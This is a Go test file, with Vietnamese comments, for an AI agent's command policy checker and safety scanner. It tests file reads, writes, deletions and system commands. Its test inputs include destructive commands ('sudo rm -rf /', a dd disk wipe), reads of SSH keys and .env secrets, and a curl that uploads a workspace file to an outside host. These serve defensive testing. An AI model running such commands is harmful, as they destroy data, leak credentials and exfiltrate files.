package policies

// ─── S1-T9: Policy test cho command mẫu ─────────────────────────────────────
//
// Các test case trong file này kiểm tra toàn bộ pipeline:
//
//	PolicyChecker (decision + risk_level) ← dùng RuleBasedChecker
//	SafetyScanner  (threat list)           ← dùng safety.DefaultScanner
//
// Tổ chức theo 4 nhóm lệnh thực tế mà AI Agent sẽ sinh ra:
//
//  1. Đọc file   — list, cat, grep, head, wc, …
//  2. Tạo/ghi file — touch, mkdir, cp, python ghi output, …
//  3. Xóa file   — rm, rmdir, shutil.rmtree, file_ops delete, …
//  4. Command hệ thống — shutdown, service, sudo, registry, credential, …
//
// Mỗi nhóm bao gồm cả sandbox.runShell, sandbox.runPython, và file_ops để bao phủ
// ba tool types hiện có.

import (
	"fmt"
	"strings"
	"testing"

	"vclaw/internal/safety"
)

// ─── Test helpers ─────────────────────────────────────────────────────────────

type policyCase struct {
	name           string
	req            Request
	wantDecision   Decision
	wantRisk       RiskLevel
	wantThreats    []safety.ThreatCategory // at least one of these must appear (empty = no threat expected)
	noThreatExpect bool                    // if true, scanner must return no threats
}

func runPolicyCases(t *testing.T, cases []policyCase) {
	t.Helper()
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			// ── Policy check ───────────────────────────────────────────────
			result := DefaultChecker.Check(tc.req)
			if result.Decision != tc.wantDecision {
				t.Errorf("decision: want %q got %q | reasons: %v",
					tc.wantDecision, result.Decision, result.Reasons)
			}
			if result.RiskLevel != tc.wantRisk {
				t.Errorf("risk_level: want %q got %q", tc.wantRisk, result.RiskLevel)
			}
			if len(result.Reasons) == 0 {
				t.Error("reasons must not be empty")
			}

			// ── Safety scan ────────────────────────────────────────────────
			var reports []safety.DangerReport
			switch tc.req.Tool {
			case ToolRunShell:
				reports = safety.DefaultScanner.ScanShell(tc.req.Input.Command)
			case ToolRunPython:
				text := tc.req.Input.Code
				if strings.TrimSpace(text) == "" {
					text = tc.req.Input.ScriptPath
				}
				reports = safety.DefaultScanner.ScanPython(text)
			case ToolFileOps:
				// file_ops threat scanning uses the path (if present) + op name.
				combined := tc.req.Input.FileOp + " " + tc.req.Input.FilePath
				reports = safety.DefaultScanner.ScanShell(combined)
			}

			if tc.noThreatExpect && len(reports) > 0 {
				t.Errorf("expected no threats but scanner found: %v",
					safety.Categories(reports))
			}
			for _, want := range tc.wantThreats {
				if !safety.HasCategory(reports, want) {
					t.Errorf("expected threat category %q not found; got: %v",
						want, safety.Categories(reports))
				}
			}

			// ── Audit explain (smoke only — must not panic) ────────────────
			explanation := Explain(result)
			if strings.TrimSpace(explanation) == "" {
				t.Error("Explain() returned empty string")
			}
		})
	}
}

// ─── 1. Đọc file ─────────────────────────────────────────────────────────────

func TestPolicy_DocFile_Shell(t *testing.T) {
	cases := []policyCase{
		{
			name:           "list workspace",
			req:            shellReq("r-sh-01", "ls -la /workspace"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "cat CSV",
			req:            shellReq("r-sh-02", "cat /workspace/data.csv"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "grep keyword in report",
			req:            shellReq("r-sh-03", "grep -i 'doanh thu' /workspace/report.txt"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "head first 30 lines",
			req:            shellReq("r-sh-04", "head -30 /workspace/input/orders.csv"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "wc line count",
			req:            shellReq("r-sh-05", "wc -l /workspace/log.txt"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "stat file info",
			req:            shellReq("r-sh-06", "stat /workspace/output/report.docx"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "find list txt files",
			req:            shellReq("r-sh-07", "find /workspace -name '*.txt' -type f"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "diff two files",
			req:            shellReq("r-sh-08", "diff /workspace/a.csv /workspace/b.csv"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_DocFile_Python(t *testing.T) {
	cases := []policyCase{
		{
			name: "pandas read csv",
			req: pythonReq("r-py-01", `
import pandas as pd
df = pd.read_csv('/workspace/data.csv')
print(df.head())
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name: "openpyxl read xlsx",
			req: pythonReq("r-py-02", `
import openpyxl
wb = openpyxl.load_workbook('/workspace/report.xlsx', read_only=True)
ws = wb.active
for row in ws.iter_rows(values_only=True):
    print(row)
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name: "python-docx read docx",
			req: pythonReq("r-py-03", `
from docx import Document
doc = Document('/workspace/contract.docx')
for para in doc.paragraphs:
    print(para.text)
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name: "open read text file",
			req: pythonReq("r-py-04", `
with open('/workspace/notes.txt', 'r', encoding='utf-8') as f:
    content = f.read()
print(content[:500])
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_DocFile_FileOps(t *testing.T) {
	cases := []policyCase{
		{
			name:           "file_ops list",
			req:            fileOpsReq("r-fo-01", "list", "/workspace"),
			wantDecision:   DecisionAllow,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		{
			name:           "file_ops read",
			req:            fileOpsReq("r-fo-02", "read", "/workspace/data.csv"),
			wantDecision:   DecisionAllow,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
	}
	runPolicyCases(t, cases)
}

// ─── 2. Tạo / ghi file ───────────────────────────────────────────────────────

func TestPolicy_TaoFile_Shell(t *testing.T) {
	cases := []policyCase{
		{
			name:           "mkdir output",
			req:            shellReq("w-sh-01", "mkdir -p /workspace/output"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name:           "touch new file",
			req:            shellReq("w-sh-02", "touch /workspace/output/result.txt"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name:           "cp copy file",
			req:            shellReq("w-sh-03", "cp /workspace/input/template.xlsx /workspace/output/report.xlsx"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name:           "python run script that creates output",
			req:            shellReq("w-sh-04", "python3 /workspace/process.py"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_TaoFile_Python(t *testing.T) {
	cases := []policyCase{
		{
			name: "pandas write csv output",
			req: pythonReq("w-py-01", `
import pandas as pd
df = pd.read_csv('/workspace/input/data.csv')
result = df.groupby('category')['amount'].sum().reset_index()
result.to_csv('/workspace/output/summary.csv', index=False)
print('Done:', len(result), 'rows')
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name: "openpyxl write xlsx",
			req: pythonReq("w-py-02", `
import openpyxl
wb = openpyxl.Workbook()
ws = wb.active
ws.append(['Name', 'Score'])
ws.append(['Alice', 95])
wb.save('/workspace/output/scores.xlsx')
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name: "python-docx create docx",
			req: pythonReq("w-py-03", `
from docx import Document
doc = Document()
doc.add_heading('Báo Cáo', 0)
doc.add_paragraph('Kết quả phân tích dữ liệu tháng 6.')
doc.save('/workspace/output/report.docx')
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name: "write json output",
			req: pythonReq("w-py-04", `
import json
data = {'total': 1234, 'items': ['a', 'b', 'c']}
with open('/workspace/output/result.json', 'w') as f:
    json.dump(data, f, ensure_ascii=False, indent=2)
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_TaoFile_FileOps(t *testing.T) {
	cases := []policyCase{
		{
			name:           "file_ops write",
			req:            fileOpsReq("w-fo-01", "write", "/workspace/output/summary.txt"),
			wantDecision:   DecisionAllow,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		{
			name:           "file_ops copy",
			req:            fileOpsReq("w-fo-02", "copy", "/workspace/input/template.xlsx"),
			wantDecision:   DecisionAllow,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
	}
	runPolicyCases(t, cases)
}

// ─── 3. Xóa file ─────────────────────────────────────────────────────────────

func TestPolicy_XoaFile_Shell(t *testing.T) {
	cases := []policyCase{
		{
			name:         "rm single file",
			req:          shellReq("d-sh-01", "rm /workspace/output/old_report.csv"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name:         "rm -rf temp dir",
			req:          shellReq("d-sh-02", "rm -rf /workspace/temp"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name:         "rm wildcard csv",
			req:          shellReq("d-sh-03", "rm /workspace/output/*.csv"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name:         "rmdir empty folder",
			req:          shellReq("d-sh-04", "rmdir /workspace/old_input"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name:         "mv (rename = implicit delete old)",
			req:          shellReq("d-sh-05", "mv /workspace/draft.docx /workspace/final.docx"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_XoaFile_Python(t *testing.T) {
	cases := []policyCase{
		{
			name: "os.remove single file",
			req: pythonReq("d-py-01", `
import os
os.remove('/workspace/output/temp_file.csv')
print('Deleted')
`),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name: "shutil.rmtree directory",
			req: pythonReq("d-py-02", `
import shutil
shutil.rmtree('/workspace/cache')
`),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name: "pathlib unlink",
			req: pythonReq("d-py-03", `
from pathlib import Path
p = Path('/workspace/output/old.xlsx')
p.unlink()
`),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		{
			name: "glob delete pattern",
			req: pythonReq("d-py-04", `
import glob, os
for f in glob.glob('/workspace/output/*.tmp'):
    os.remove(f)
`),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_XoaFile_FileOps(t *testing.T) {
	cases := []policyCase{
		{
			name:         "file_ops delete",
			req:          fileOpsReq("d-fo-01", "delete", "/workspace/output/old_data.csv"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
		},
		{
			name:         "file_ops move",
			req:          fileOpsReq("d-fo-02", "move", "/workspace/draft.txt"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
		},
	}
	runPolicyCases(t, cases)
}

// ─── 4. Command hệ thống ─────────────────────────────────────────────────────

func TestPolicy_HeThong_Shutdown(t *testing.T) {
	cases := []policyCase{
		{
			name:         "shutdown now",
			req:          shellReq("sys-sh-01", "shutdown -h now"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatSystemShutdown},
		},
		{
			name:         "reboot",
			req:          shellReq("sys-sh-02", "reboot"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatSystemShutdown},
		},
		{
			name: "python os.system shutdown",
			req: pythonReq("sys-py-01", `
import os
os.system('shutdown /s /t 0')
`),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatSystemShutdown},
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_HeThong_ServiceControl(t *testing.T) {
	cases := []policyCase{
		{
			name:         "systemctl stop service",
			req:          shellReq("sys-sh-03", "systemctl stop nginx"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
		},
		{
			name:         "service restart",
			req:          shellReq("sys-sh-04", "service postgresql restart"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
		},
		{
			name:         "windows sc stop",
			req:          shellReq("sys-sh-05", "sc stop wuauserv"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
		},
		{
			name:         "net stop service",
			req:          shellReq("sys-sh-06", "net stop \"Windows Update\""),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_HeThong_Registry(t *testing.T) {
	cases := []policyCase{
		{
			name:         "reg add key",
			req:          shellReq("sys-sh-07", "reg add HKLM\\SOFTWARE\\MyApp /v Version /t REG_SZ /d 1.0"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatRegistryAccess},
		},
		{
			name:         "reg delete key",
			req:          shellReq("sys-sh-08", "reg delete HKCU\\Software\\Temp /f"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatRegistryAccess},
		},
		{
			name: "python winreg access",
			req: pythonReq("sys-py-02", `
import winreg
key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft')
`),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatRegistryAccess},
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_HeThong_PrivilegeEscalation(t *testing.T) {
	cases := []policyCase{
		{
			name:         "sudo rm root",
			req:          shellReq("sys-sh-09", "sudo rm -rf /"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
			wantThreats:  []safety.ThreatCategory{safety.ThreatPrivilegeEscalation},
		},
		{
			name:         "chmod 777 sensitive",
			req:          shellReq("sys-sh-10", "chmod 777 /etc/passwd"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
		},
		{
			name:         "kill all python processes",
			req:          shellReq("sys-sh-11", "killall python3"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
		},
		{
			name:         "dd wipe disk",
			req:          shellReq("sys-sh-12", "dd if=/dev/zero of=/dev/sda"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_HeThong_CredentialAccess(t *testing.T) {
	cases := []policyCase{
		{
			name:         "cat .env file",
			req:          shellReq("cred-sh-01", "cat /workspace/.env"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskCredentialAccess,
			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
		},
		{
			name:         "read id_rsa private key",
			req:          shellReq("cred-sh-02", "cat /root/.ssh/id_rsa"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskCredentialAccess,
			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
		},
		{
			name:         "access credentials.json",
			req:          shellReq("cred-sh-03", "cat /workspace/credentials.json"),
			wantDecision: DecisionBlock,
			wantRisk:     RiskCredentialAccess,
			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
		},
		{
			name: "python read .env",
			req: pythonReq("cred-py-01", `
with open('/workspace/.env', 'r') as f:
    secrets = f.read()
print(secrets)
`),
			wantDecision: DecisionBlock,
			wantRisk:     RiskCredentialAccess,
			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
		},
		{
			name: "python dotenv load",
			req: pythonReq("cred-py-02", `
from dotenv import load_dotenv
import os
load_dotenv('/workspace/.env')
print(os.getenv('API_KEY'))
`),
			wantDecision: DecisionBlock,
			wantRisk:     RiskCredentialAccess,
			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
		},
	}
	runPolicyCases(t, cases)
}

func TestPolicy_HeThong_NetworkAccess(t *testing.T) {
	cases := []policyCase{
		{
			name:         "curl external URL",
			req:          shellReq("net-sh-01", "curl https://api.example.com/data"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskExternalNetwork,
			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
		},
		{
			name:         "wget download file",
			req:          shellReq("net-sh-02", "wget https://files.example.com/dataset.zip -O /workspace/data.zip"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskExternalNetwork,
			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
		},
		{
			name: "python requests.get",
			req: pythonReq("net-py-01", `
import requests
resp = requests.get('https://api.example.com/v1/items')
data = resp.json()
`),
			wantDecision: DecisionBlock,
			wantRisk:     RiskExternalNetwork,
			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
		},
		{
			name: "python subprocess curl",
			req: pythonReq("net-py-02", `
import subprocess
result = subprocess.run(['curl', 'https://example.com'], capture_output=True)
`),
			wantDecision: DecisionBlock,
			wantRisk:     RiskHighRisk,
		},
	}
	runPolicyCases(t, cases)
}

// ─── 5. Tổng hợp: bảng toàn diện theo agent scenario ────────────────────────
//
// Các lệnh bên dưới mô phỏng luồng làm việc thực tế của AI Agent xử lý
// một tác vụ văn phòng: nhận file đầu vào → phân tích → sinh báo cáo →
// dọn dẹp file tạm → gửi kết quả.

func TestPolicy_AgentWorkflow_OfficeTask(t *testing.T) {
	cases := []policyCase{
		// Bước 1: Kiểm tra workspace
		{
			name:           "list workspace before start",
			req:            shellReq("wf-01", "ls -la /workspace/input"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		// Bước 2: Xem file đầu vào
		{
			name: "read input xlsx",
			req: pythonReq("wf-02", `
import pandas as pd
df = pd.read_excel('/workspace/input/sales_q2.xlsx')
print(df.dtypes)
print(df.shape)
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		// Bước 3: Phân tích dữ liệu và ghi kết quả
		{
			name: "analyze and write output",
			req: pythonReq("wf-03", `
import pandas as pd
df = pd.read_excel('/workspace/input/sales_q2.xlsx')
summary = df.groupby('region')['revenue'].agg(['sum', 'mean', 'count'])
summary.to_excel('/workspace/output/regional_summary.xlsx')
`),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeWrite,
			noThreatExpect: true,
		},
		// Bước 4: Xóa file tạm → phải qua HITL
		{
			name: "cleanup temp files - needs approval",
			req: pythonReq("wf-04", `
import glob, os
for f in glob.glob('/workspace/output/*.tmp'):
    os.remove(f)
`),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskNeedsApproval,
			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
		},
		// Bước 5: Kiểm tra output
		{
			name:           "verify output file exists",
			req:            shellReq("wf-05", "ls -lh /workspace/output/regional_summary.xlsx"),
			wantDecision:   DecisionRequiresApproval,
			wantRisk:       RiskSafeRead,
			noThreatExpect: true,
		},
		// Bước 5b: Agent cố tải dữ liệu bên ngoài → bị chặn
		{
			name:         "unexpected network call - blocked",
			req:          shellReq("wf-06", "curl https://external-api.com/upload -d @/workspace/output/regional_summary.xlsx"),
			wantDecision: DecisionRequiresApproval,
			wantRisk:     RiskExternalNetwork,
			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
		},
	}
	runPolicyCases(t, cases)
}

// ─── 6. SafeWriteRequiresConfirm mode ────────────────────────────────────────
//
// Khi bật chế độ conservative, mọi thao tác safe_write đều cần xác nhận.

func TestPolicy_ConservativeMode_SafeWrite(t *testing.T) {
	conservative := NewRuleBasedChecker(RuleBasedConfig{SafeWriteRequiresConfirm: true})

	conservativeCases := []struct {
		name string
		req  Request
	}{
		{"mkdir in conservative mode", shellReq("c-01", "mkdir /workspace/output")},
		{"touch in conservative mode", shellReq("c-02", "touch /workspace/new.txt")},
		{"python3 script in conservative mode", shellReq("c-03", "python3 /workspace/analyze.py")},
		{"file_ops write in conservative mode", fileOpsReq("c-04", "write", "/workspace/output.csv")},
	}

	for _, tc := range conservativeCases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			r := conservative.Check(tc.req)
			if r.Decision != DecisionRequiresApproval {
				t.Errorf("conservative mode: expected requires_approval, got %q", r.Decision)
			}
			if r.RiskLevel != RiskSafeWrite {
				t.Errorf("conservative mode: risk_level should still be safe_write, got %q", r.RiskLevel)
			}
		})
	}
}

// ─── 7. Explain output format ────────────────────────────────────────────────

func TestPolicy_ExplainOutput_AllDecisions(t *testing.T) {
	testCases := []struct {
		name string
		req  Request
	}{
		{"explain allow", shellReq("ex-01", "ls /workspace")},
		{"explain requires_approval", shellReq("ex-02", "rm /workspace/old.csv")},
		{"explain block", shellReq("ex-03", "shutdown -h now")},
		{"explain credential block", shellReq("ex-04", "cat .env")},
	}

	for _, tc := range testCases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			result := DefaultChecker.Check(tc.req)
			explanation := Explain(result)

			if !strings.Contains(explanation, string(result.Decision)) {
				t.Errorf("Explain() should contain decision %q\nGot: %s", result.Decision, explanation)
			}
			if !strings.Contains(explanation, string(result.RiskLevel)) {
				t.Errorf("Explain() should contain risk_level %q\nGot: %s", result.RiskLevel, explanation)
			}
			for _, reason := range result.Reasons {
				if !strings.Contains(explanation, reason) {
					t.Errorf("Explain() missing reason %q\nGot: %s", reason, explanation)
				}
			}
			// Print để developer thấy output khi chạy -v
			fmt.Printf("\n[%s]\n%s", tc.name, explanation)
		})
	}
}
